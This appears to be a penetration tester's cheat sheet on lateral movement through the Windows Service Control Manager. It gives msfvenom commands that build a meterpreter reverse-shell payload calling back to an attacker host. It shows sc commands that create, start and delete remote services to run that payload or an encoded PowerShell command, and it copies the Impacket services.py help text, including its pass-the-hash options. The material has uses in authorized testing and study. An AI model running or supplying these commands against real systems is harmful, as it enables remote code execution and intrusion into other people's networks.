# Service Control Manager

## 01 - Manual

### 1.1 - Usage

After we generate a reverse/bind shell refer to the techniques to copy the shell via [[Remote File Access|SMB]]

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe-service -o shellsvc.exe

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd
```

Here's the following syntax

```
C:\> sc \\<IP> create <ServiceSVC> binpath= "c:\path\to\shellsvc.exe"

C:\> sc \\<IP> start <ServiceSVC>

C:\> sc \\<IP> delete <ServiceSVC>
```

### 1.2 - Use Cases

```
C:\> sc \\<IP> create pwshpayload binpath= "powershell -E <base64_encoded>"

C:\> sc \\<IP> start pwshpayload

C:\> sc \\<IP> delete pwshpayload

C:\> sc \\<IP> create TestMaintenance binpath= "c:\path\to\shellsvc.exe"

C:\> C:\> sc \\<IP> start TestMaintenance

C:\> C:\> sc \\<IP> delete TestMaintenance
```

## 02 - Impacket

### 2.1 - Help Menu

```
$ services -h
Impacket v0.11.0 - Copyright 2023 Fortra

usage: services.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address]
                   [-port [destination port]]
                   target {start,stop,delete,status,config,list,create,change} ...

Windows Service manipulation script.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  {start,stop,delete,status,config,list,create,change}
                        actions
    start               starts the service
    stop                stops the service
    delete              deletes the service
    status              returns service status
    config              returns service configuration
    list                list available services
    create              create a service
    change              change a service configuration

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid
                        credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target
                        is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
```

### 2.2 - Usage

TODO: Fill this info

`$ services`

---
## References

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)